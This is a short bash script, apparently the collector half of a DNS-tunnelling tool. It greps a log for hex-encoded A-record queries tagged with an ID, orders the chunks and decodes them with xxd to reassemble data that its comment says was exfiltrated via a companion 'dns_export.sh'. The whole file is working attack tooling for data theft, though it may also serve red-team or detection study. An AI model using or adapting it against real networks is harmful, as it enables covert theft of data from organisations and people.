#!/bin/bash
#Reassemble data exfiltrated via dns_export.sh
#Example usage ./dns_reassembly.sh /var/log/syslog UNIQ_ID
grep -o -e " A[0-9a-f].*.$2" $1 | cut -dA -f2 | cut -d. -f1-2 | sort -t. -k2 -g -u | cut -d. -f1 | tr -d '\n' | xxd -r -p
